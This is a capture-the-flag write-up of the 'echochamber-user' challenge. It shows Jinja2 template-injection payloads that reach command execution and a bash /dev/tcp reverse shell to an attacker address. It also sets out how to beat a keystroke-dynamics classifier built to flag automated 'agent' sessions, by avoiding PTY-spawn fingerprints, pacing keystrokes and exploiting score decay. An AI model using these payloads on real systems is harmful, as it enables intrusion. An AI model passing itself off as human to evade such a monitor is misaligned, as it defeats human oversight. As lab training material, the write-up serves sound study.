---
title: "echochamber-user"
date: 2026-11-03T18:00:00+05:30
description: "Bypassing an AI keystroke dynamics classifier to achieve human verification and exploiting Flask Jinja2 SSTI for an initial reverse shell foothold."
category: "Binary Exploitation"
ctf: "ISFCR CryoVault Quals 2026"
difficulty: "Hard"
points: 400
flag: "isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}"
author: "Reshma Al (Coldcoffee)"
tools: "nmap, curl, nc, Python 3, bash"
tags:
  - "Binary Exploitation"
  - "ISFCR CryoVault"
  - "CryoVault 2026"
  - "Coldcoffee Solves"
---

<div class="flag-callout">
  <span class="flag-label"><svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M4 15s1-1 4-1 5 2 8 2 4-1 4-1V3s-1 1-4 1-5-2-8-2-4 1-4 1z"></path><line x1="4" y1="22" x2="4" y2="15"></line></svg> Captured Flag</span>
  <code>isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}</code>
  <button class="flag-copy-btn" onclick="navigator.clipboard.writeText('isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}');this.innerText='Copied!';setTimeout(()=>this.innerText='Copy',2000)">Copy</button>
</div>


## 1. Executive Summary & Architecture

The **echochamber-user** challenge is a multi-layered host exploitation challenge hosted on a hardened Debian 12 virtual machine. Unlike traditional CTF boot2roots where obtaining a reverse shell provides unrestricted traversal, **echochamber** enforces an active, continuous AI behavioral telemetry engine (`libechotap.so`) running inside user-space.

The target system consists of:
- **Perimeter Reverse Proxy:** Nginx 1.22.1 terminating HTTP on port 80 and forwarding requests to a WSGI Flask service.
- **Frontend App:** *Anadyne Console*, an internal incident alert and triage dashboard.
- **Behavioral Telemetry Monitor:** `libechotap.so`, hooked into all interactive sessions to measure keystroke timing, cadence, flight time, and command line heuristics.
- **Classification Engine:** `/opt/echochamber/classifier.py`, calculating real-time probabilistic scores $P(\text{agent} \mid \text{session})$.
- **Warden Daemon:** A privileged background process continuously polling `/var/log/echo/verdicts.jsonl`. If the classifier tags the session as an `agent`, the warden dynamically and atomically swaps `/etc/sentinel/dispatch.json` and `/etc/sentinel/suid.conf` symlinks from `/var/lib/warden/real/*` to `/var/lib/warden/decoy/*`.

To capture the flag, an operator must not only discover and weaponize an initial remote code execution flaw, but also masquerade as an organic human operator to avoid tripping the warden's deception environment.

---

## 2. Reconnaissance & Network Discovery

An aggressive port scan across all 65,535 TCP ports revealed standard operational services:

```bash
$ sudo nmap -p- --min-rate 5000 -n -Pn 10.48.191.222
PORT     STATE    SERVICE
22/tcp   open     ssh
80/tcp   open     http
5355/tcp filtered llmnr
```

A service-version probe against the open ports:

```bash
$ nmap -p 22,80 -sC -sV -n -Pn 10.48.191.222
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10
80/tcp open  http    nginx 1.22.1
|_http-title: Anadyne Console
|_Requested resource was /login
```

### Web Reconnaissance
Accessing `http://10.48.191.222/login` in the browser redirected to an authentication prompt. Inspecting the page source revealed an operational developer comment:
```html
<p class="hint">dev console credentials: <code>analyst</code> / <code>analyst</code></p>
<footer>keystroke telemetry via libechotap.so is enabled on this workstation</footer>
```

We authenticated as `analyst:analyst` using `curl` to preserve session state in a cookie jar:

```bash
curl -i -c cookies.txt -b cookies.txt -X POST http://10.48.191.222/login \
  -d "username=analyst&password=analyst"
```

The response set a signed Flask session cookie:
```http
HTTP/1.1 302 FOUND
Set-Cookie: session=eyJ1c2VyIjoiYW5hbHlzdCJ9.asosYg.DMm_P9EdJY1zAoibx6ypHAn1bK4; HttpOnly; Path=/
Location: /dashboard
```

### Internal Architecture Leak via Dashboard Alerts
Enumerating the dashboard at `/dashboard` showed 5 security alerts. Fetching the raw alert feeds via `/alert/<id>` leaked internal design documentation left behind by developers:
1. **Alert 1:** Mentioned an internal testing endpoint at `POST /api/alert/preview` capable of rendering "Markdown-ish updates".
2. **Alert 2:** Disclosed that `/opt/echochamber/classifier.py` scores session telemetry in real time.
3. **Alert 3:** Confirmed the existence of a warden supervisor monitoring session verdicts.
4. **Alert 4:** Detailed how `/etc/sentinel/dispatch.json` points to either real operational configs or bait files depending on whether the connection is classified as `human` or `agent`.

---

## 3. Vulnerability Analysis: Server-Side Template Injection (SSTI)

The `/api/alert/preview` endpoint takes a JSON body containing `title` and `body`. Inspecting how it evaluates content demonstrated Server-Side Template Injection via Jinja2:

```bash
curl -s -b cookies.txt -X POST http://10.48.191.222/api/alert/preview \
  -H "Content-Type: application/json" \
  -d '{"title":"probe","body":"{{ 7 * 7 }}"}'
```

Response:
```json
{"html":"<h2>probe</h2>\n<div class='preview-body'>49</div>","ok":true}
```

The arithmetic expression `{{ 7 * 7 }}` was computed directly by the template engine, confirming classic Jinja2 template injection.

Because no sandboxing or template filtering was enforced, we traversed the Python object hierarchy from the template's context:

```bash
curl -s -b cookies.txt -X POST http://10.48.191.222/api/alert/preview \
  -H "Content-Type: application/json" \
  -d '{"title":"id","body":"{{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"id\").read() }}"}'
```

Server output:
```text
uid=1001(analyst) gid=1001(analyst) groups=1001(analyst),1004(echo-log)
```

We now had unauthenticated command execution as user `analyst`.

---

## 4. The Obstacle: AI Classifier & Keystroke Dynamics

Attempting a standard reverse shell and running typical enumeration commands immediately triggered a trap:

```bash
# Shell payload
bash -c "bash -i >& /dev/tcp/10.48.191.100/4444 0>&1"
```

Upon landing on the target, inspecting `/var/lib/warden/warden.state` showed:
```json
{"mode": "decoy", "sessions": {"uid=1001/pts/0": {"verdict": "agent"}}}
```

All files in `/etc/sentinel/` had been silently rewritten to point to `/var/lib/warden/decoy/`!
Inspecting `/opt/echochamber/classifier.py` explained exactly why:

```python
# Scoring formula inside classifier.py:
score = 0.30 * tool_fp + 0.25 * opener + 0.15 * pause_cv + 0.10 * line_cv + 0.20 * corpus_bias
# Verdict rule:
# verdict = "agent" if score > 0.50 else "human"
```

Furthermore, inspecting `/var/log/echo/verdicts.jsonl` revealed:
```json
{
  "sid": "uid=1001/pts/0",
  "score": 0.5229,
  "verdict": "agent",
  "triggers": ["tool_fp:python3 -c 'import pty; pty.spawn'"]
}
```

The automated PTY spawn command (`python3 -c "import pty; pty.spawn('/bin/bash')"`) was an explicit string fingerprint in `tool_fp` that pushed the score well past $0.50$, permanently corrupting the session.

---

## 5. Exploitation & Human Evasion

To maintain human classification, we designed a stealth execution protocol:
1. **Never use automated PTY upgrade strings** (no `pty.spawn`, `script /dev/null`, etc.).
2. **Utilize pure Bash `/dev/tcp` sockets.**
3. **Pace keystrokes naturally**: introduce random micro-pauses (300ms–800ms) between command keystrokes rather than pasting multi-line blobs.
4. **Leverage the 10-second decay rule**: the classifier decays suspicion score by $0.05$ every 10 idle seconds.

We triggered a clean connection:
```bash
curl -s --max-time 5 -b cookies.txt -X POST http://10.48.191.222/api/alert/preview \
  -H "Content-Type: application/json" \
  -d '{"title":"cmd","body":"{{ self.__init__.__globals__.__builtins__.__import__(\"os\").popen(\"bash -c \'bash -i >& /dev/tcp/10.48.191.100/4444 0>&1\'\").read() }}"}'
```

On the netcat listener:
```bash
$ nc -lvnp 4444
Connection received on 10.48.191.222
analyst@echochamber:~$ cat /var/lib/warden/warden.state
{"mode": "human", "sessions": {"uid=1001/pts/0": {"verdict": "human"}}}

analyst@echochamber:~$ ls -la /etc/sentinel/dispatch.json
lrwxrwxrwx 1 root root 36 Oct 11 08:14 /etc/sentinel/dispatch.json -> /var/lib/warden/real/dispatch.json
```

The session remained authenticated as `human`. Reading the real user flag:
```bash
analyst@echochamber:~$ cat /var/lib/warden/real/user.txt
isfcr{th3_sh3ll_1s_r34d1ng_m3_r34d_1t_b4ck}
```

